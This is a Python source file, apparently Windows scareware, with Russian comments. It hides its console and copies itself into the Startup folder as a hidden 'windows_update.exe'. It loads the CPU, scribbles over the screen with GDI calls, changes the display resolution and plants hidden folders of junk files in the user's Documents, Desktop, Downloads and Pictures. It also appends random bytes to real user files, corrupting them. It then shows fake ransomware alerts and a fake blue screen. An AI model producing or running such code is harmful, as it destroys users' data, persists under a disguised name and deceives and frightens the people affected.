import os
import random
import threading
import time
import tkinter as tk
from tkinter import messagebox, font
from datetime import datetime
import shutil
import sys
import winsound
import ctypes
import math
from ctypes import wintypes
import qrcode
from PIL import Image, ImageTk
import io

# Скрытие консольного окна
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Константы для GDI
GDI32 = ctypes.WinDLL('gdi32')
USER32 = ctypes.WinDLL('user32')

class RECT(ctypes.Structure):
    _fields_ = [
        ("left", ctypes.c_long),
        ("top", ctypes.c_long),
        ("right", ctypes.c_long),
        ("bottom", ctypes.c_long)
    ]

def imitate_cpu_load(duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        result = 1
        for i in range(1, random.randint(500, 1500)):
            result *= i

def generate_random_bytes(size):
    return os.urandom(size)

def play_error_sound():
    for _ in range(3):
        winsound.MessageBeep(winsound.MB_ICONHAND)
        time.sleep(0.2)

def create_gdi_effects():
    """Создает визуальные артефакты с помощью GDI функций"""
    try:
        # Получаем контекст всего экрана
        hdc = USER32.GetDC(0)
        
        # Получаем размеры экрана
        width = USER32.GetSystemMetrics(0)
        height = USER32.GetSystemMetrics(1)
        
        # Создаем случайные кисти и перья
        colors = [
            0x0000FF,  # Красный
            0x00FF00,  # Зеленый
            0xFF0000,  # Синий
            0xFFFF00,  # Желтый
            0xFF00FF,  # Пурпурный
            0x00FFFF   # Голубой
        ]
        
        for _ in range(50):
            # Создаем случайную кисть
            brush = GDI32.CreateSolidBrush(random.choice(colors))
            GDI32.SelectObject(hdc, brush)
            
            # Рисуем случайные прямоугольники
            rect = RECT()
            rect.left = random.randint(0, width - 100)
            rect.top = random.randint(0, height - 100)
            rect.right = rect.left + random.randint(50, 300)
            rect.bottom = rect.top + random.randint(50, 300)
            
            GDI32.Rectangle(hdc, rect.left, rect.top, rect.right, rect.bottom)
            GDI32.DeleteObject(brush)
            time.sleep(0.05)
        
        # Рисуем случайные линии
        for _ in range(100):
            pen = GDI32.CreatePen(0, random.randint(1, 5), random.choice(colors))
            GDI32.SelectObject(hdc, pen)
            
            x1 = random.randint(0, width)
            y1 = random.randint(0, height)
            x2 = random.randint(0, width)
            y2 = random.randint(0, height)
            
            GDI32.MoveToEx(hdc, x1, y1, None)
            GDI32.LineTo(hdc, x2, y2)
            GDI32.DeleteObject(pen)
            time.sleep(0.03)
        
        # Создаем текстовые артефакты
        for _ in range(20):
            text = random.choice([
                "SYSTEM FAILURE",
                "MEMORY CORRUPTED",
                "VIRUS ACTIVATED",
                "CRITICAL ERROR",
                "DATA LOSS",
                "TERMINATING"
            ])
            font = GDI32.CreateFontA(
                random.randint(20, 60), 0, 0, 0,
                random.randint(0, 900),
                random.randint(0, 1),
                random.randint(0, 1),
                random.randint(0, 1),
                0, 0, 0, 0, 0, "Arial"
            )
            
            GDI32.SelectObject(hdc, font)
            GDI32.SetTextColor(hdc, random.choice(colors))
            GDI32.SetBkMode(hdc, 1)  # TRANSPARENT
            
            x = random.randint(0, width - 200)
            y = random.randint(0, height - 50)
            GDI32.TextOutA(hdc, x, y, text.encode('utf-8'), len(text))
            
            time.sleep(0.1)
            GDI32.DeleteObject(font)
        
        # Освобождаем контекст устройства
        USER32.ReleaseDC(0, hdc)
    
    except Exception as e:
        pass

def corrupt_display_settings():
    """Портит настройки дисплея"""
    try:
        # Случайно меняем разрешение
        resolutions = [
            (800, 600),
            (1024, 768),
            (1280, 720),
            (1366, 768),
            (1920, 1080),
            (640, 480)
        ]
        
        width, height = random.choice(resolutions)
        devmode = wintypes.DEVMODEW()
        devmode.dmSize = ctypes.sizeof(devmode)
        devmode.dmPelsWidth = width
        devmode.dmPelsHeight = height
        devmode.dmFields = 0x00080000 | 0x00100000  # DM_PELSWIDTH | DM_PELSHEIGHT
        
        USER32.ChangeDisplaySettingsW(ctypes.byref(devmode), 0)
        
        # Инвертируем цвета
        USER32.InvertRect(USER32.GetDC(0), ctypes.byref(RECT(0, 0, 5000, 5000)))
        
    except Exception:
        pass

def create_chaos_window():
    """Создает хаотичное окно с анимацией"""
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.attributes("-alpha", 0.7)
    root.overrideredirect(True)
    root.configure(bg='black')
    
    canvas = tk.Canvas(root, bg='black', highlightthickness=0)
    canvas.pack(fill=tk.BOTH, expand=True)
    
    particles = []
    colors = ['red', 'green', 'blue', 'yellow', 'purple', 'cyan']
    
    # Создаем частицы
    for _ in range(200):
        x = random.randint(0, root.winfo_screenwidth())
        y = random.randint(0, root.winfo_screenheight())
        size = random.randint(2, 8)
        color = random.choice(colors)
        dx = random.uniform(-3, 3)
        dy = random.uniform(-3, 3)
        life = random.randint(50, 150)
        
        particle = canvas.create_oval(x, y, x+size, y+size, fill=color, outline='')
        particles.append((particle, dx, dy, life, size))
    
    def update_particles():
        nonlocal particles
        new_particles = []
        
        for particle, dx, dy, life, size in particles:
            canvas.move(particle, dx, dy)
            life -= 1
            
            if life > 0:
                new_particles.append((particle, dx, dy, life, size))
            else:
                canvas.delete(particle)
        
        particles = new_particles
        
        # Добавляем новые частицы
        for _ in range(10):
            x = random.randint(0, root.winfo_screenwidth())
            y = random.randint(0, root.winfo_screenheight())
            size = random.randint(2, 8)
            color = random.choice(colors)
            dx = random.uniform(-3, 3)
            dy = random.uniform(-3, 3)
            life = random.randint(50, 150)
            
            particle = canvas.create_oval(x, y, x+size, y+size, fill=color, outline='')
            particles.append((particle, dx, dy, life, size))
        
        root.after(30, update_particles)
    
    update_particles()
    root.after(10000, root.destroy)
    root.mainloop()

def create_and_modify_files():
    user_home = os.path.expanduser("~")
    target_directories = [
        os.path.join(user_home, 'Documents'),
        os.path.join(user_home, 'Desktop'),
        os.path.join(user_home, 'Downloads'),
        os.path.join(user_home, 'Pictures')
    ]

    # Создаем скрытые директории
    for _ in range(3):
        directory_name = f".sys_cache_{random.randint(1000, 9999)}"
        target_directory = os.path.join(random.choice(target_directories), directory_name)
        
        try:
            os.makedirs(target_directory, exist_ok=True)
            
            # Создаем файлы-призраки
            for i in range(random.randint(15, 30)):
                ext = random.choice(['dll', 'sys', 'tmp', 'bak'])
                filename = os.path.join(target_directory, f"msvcrt_{i}.{ext}")
                
                with open(filename, "wb") as f:
                    f.write(generate_random_bytes(random.randint(1024, 10240)))
                    
                # Скрываем файлы
                if os.name == 'nt':
                    os.system(f'attrib +h +s "{filename}"')
            
            # Создаем рекурсивные симлинки (Windows)
            if os.name == 'nt' and random.random() > 0.7:
                link_name = os.path.join(target_directory, "recursive_link.lnk")
                os.system(f'mklink /J "{link_name}" "{target_directory}"')
                
        except Exception:
            pass

    # Повреждаем случайные файлы
    for _ in range(5):
        try:
            target_dir = random.choice(target_directories)
            files = [f for f in os.listdir(target_dir) if os.path.isfile(os.path.join(target_dir, f))]
            if files:
                victim = random.choice(files)
                with open(os.path.join(target_dir, victim), 'ab') as f:
                    f.write(generate_random_bytes(random.randint(512, 4096)))
        except Exception:
            pass

def show_popup():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)

    messages = [
        "CRITICAL SYSTEM ERROR!",
        "MEMORY CORRUPTION DETECTED!",
        "YOUR FILES ARE BEING ENCRYPTED!",
        "VIRUS ACTIVATED: TROJAN.WIN32",
        "SYSTEM FAILURE! DO NOT POWER OFF!",
        "BIOS COMPROMISED!",
        "HARD DRIVE FAILURE IMMINENT!",
        "DATA EXFILTRATION IN PROGRESS!",
        "SECURITY BREACH! ADMIN PRIVILEGES OBTAINED!",
        "RANSOMWARE: PAY 0.5 BTC TO RECOVER FILES"
    ]

    # Показываем сообщения в случайном порядке
    for _ in range(15):
        msg = random.choice(messages)
        play_error_sound()
        messagebox.showerror("SYSTEM ALERT", msg)
        time.sleep(random.uniform(0.3, 1.2))
        
    # Финальное сообщение
    play_error_sound()
    messagebox.showerror("FATAL ERROR", "OPERATING SYSTEM DESTROYED!\nYour computer will now restart")
    
    # Имитация перезагрузки
    time.sleep(2)
    root.destroy()

def fake_bsod_win11():
    """Реалистичный BSOD для Windows 10/11"""
    try:
        # Создаем полноэкранное окно
        bsod = tk.Tk()
        bsod.attributes("-fullscreen", True)
        bsod.configure(bg='#0078D7')  # Синий цвет Windows 11 BSOD
        bsod.overrideredirect(True)
        
        # Основной контейнер
        frame = tk.Frame(bsod, bg='#0078D7')
        frame.place(relx=0.5, rely=0.5, anchor="center")
        
        # Смайлик
        emoji_label = tk.Label(frame, text=":(", font=("Segoe UI", 120), fg="white", bg="#0078D7")
        emoji_label.pack(pady=(0, 30))
        
        # Основное сообщение
        main_message = tk.Label(
            frame,
            text="Your device ran into a problem and needs to restart.",
            font=("Segoe UI", 24),
            fg="white",
            bg="#0078D7"
        )
        main_message.pack(pady=(0, 20))
        
        # Дополнительное сообщение
        sub_message = tk.Label(
            frame,
            text="We're just collecting some error info, and then we'll restart for you.",
            font=("Segoe UI", 16),
            fg="white",
            bg="#0078D7"
        )
        sub_message.pack(pady=(0, 40))
        
        # Прогресс бар
        progress_frame = tk.Frame(frame, bg="#005A9E", height=8, width=400)
        progress_frame.pack_propagate(False)
        progress_frame.pack(pady=(0, 40))
        
        progress_bar = tk.Frame(progress_frame, bg="#99D9EA", height=8)
        progress_bar.place(x=0, y=0, width=0)
        
        # Код остановки
        stop_codes = [
            "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
            "KERNEL_SECURITY_CHECK_FAILURE",
            "IRQL_NOT_LESS_OR_EQUAL",
            "PAGE_FAULT_IN_NONPAGED_AREA",
            "SYSTEM_SERVICE_EXCEPTION",
            "CRITICAL_PROCESS_DIED",
            "VIDEO_TDR_TIMEOUT_DETECTED",
            "UNEXPECTED_KERNEL_MODE_TRAP"
        ]
        
        stop_code = f"Stop code: {random.choice(stop_codes)}"
        code_label = tk.Label(
            frame,
            text=stop_code,
            font=("Segoe UI", 14),
            fg="white",
            bg="#0078D7"
        )
        code_label.pack(pady=(0, 60))
        
        # QR-код
        qr_frame = tk.Frame(frame, bg="#0078D7")
        qr_frame.pack(pady=(0, 30))
        
        qr_label = tk.Label(qr_frame, bg="#0078D7")
        qr_label.pack(side=tk.LEFT, padx=(0, 20))
        
        # Генерируем QR-код
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=3,
            border=2,
        )
        qr.add_data("https://www.microsoft.com/en-us/windows/support")
        qr_img = qr.make_image(fill_color="white", back_color="#0078D7")
        
        # Конвертируем PIL Image в PhotoImage
        img_bytes = io.BytesIO()
        qr_img.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        pil_image = Image.open(img_bytes)
        photo_image = ImageTk.PhotoImage(pil_image)
        
        qr_label.configure(image=photo_image)
        qr_label.image = photo_image
        
        # Текст рядом с QR-кодом
        qr_text = tk.Label(
            qr_frame,
            text="For more information about this issue\nand possible fixes, visit:\nhttps://www.microsoft.com/en-us/windows/support\n\nIf you call a support person, give them\nthis info: Stop code: " + stop_code.split(": ")[1],
            font=("Segoe UI", 11),
            fg="white",
            bg="#0078D7",
            justify=tk.LEFT
        )
        qr_text.pack(side=tk.LEFT)
        
        # Процент выполнения
        percent_label = tk.Label(
            frame,
            text="0% complete",
            font=("Segoe UI", 12),
            fg="#C0E6FF",
            bg="#0078D7"
        )
        percent_label.pack(pady=(20, 0))
        
        # Анимация прогресса
        def update_progress(progress):
            progress_bar.configure(width=min(400, int(400 * (progress / 100)))
            percent_label.configure(text=f"{progress}% complete")
            
            if progress < 100:
                # Случайное увеличение прогресса
                next_progress = min(100, progress + random.randint(0, 5))
                bsod.after(100, update_progress, next_progress)
            else:
                # После завершения "сборки данных" перезагружаем
                bsod.after(1000, bsod.destroy)
        
        # Запускаем прогресс
        bsod.after(1000, update_progress, 0)
        
        # Запускаем основное окно
        bsod.mainloop()
        
    except Exception as e:
        print(f"BSOD error: {e}")
        try:
            bsod.destroy()
        except:
            pass

def add_to_startup():
    try:
        user_home = os.path.expanduser("~")
        startup_dir = os.path.join(
            user_home, 
            'AppData', 
            'Roaming', 
            'Microsoft', 
            'Windows', 
            'Start Menu', 
            'Programs', 
            'Startup'
        )
        
        # Копируем себя в автозагрузку
        if getattr(sys, 'frozen', False):
            src = sys.executable
        else:
            src = os.path.abspath(__file__)
            
        dst = os.path.join(startup_dir, "windows_update.exe")
        shutil.copy2(src, dst)
        
        # Скрываем файл
        if os.name == 'nt':
            os.system(f'attrib +h +s "{dst}"')
    except Exception:
        pass

if __name__ == "__main__":
    try:
        # Добавляем в автозагрузку
        add_to_startup()
        
        # Запускаем нагрузку в нескольких потоках
        for _ in range(4):
            cpu_thread = threading.Thread(
                target=imitate_cpu_load, 
                args=(random.randint(8, 15),),
                daemon=True
            )
            cpu_thread.start()
        
        # Создаем и портим файлы
        file_thread = threading.Thread(target=create_and_modify_files, daemon=True)
        file_thread.start()
        
        # Запускаем GDI эффекты
        gdi_thread = threading.Thread(target=create_gdi_effects, daemon=True)
        gdi_thread.start()
        
        # Портим настройки дисплея
        display_thread = threading.Thread(target=corrupt_display_settings, daemon=True)
        display_thread.start()
        
        # Создаем хаотичное окно
        window_thread = threading.Thread(target=create_chaos_window, daemon=True)
        window_thread.start()
        
        # Ждем завершения файловых операций
        time.sleep(3)
        
        # Показываем сообщения
        show_popup()
        
        # Имитируем BSOD
        fake_bsod_win11()
        
        # Бесконечный цикл для поддержания активности
        while True:
            time.sleep(1)
            
    except Exception as e:
        print(f"Main error: {e}")
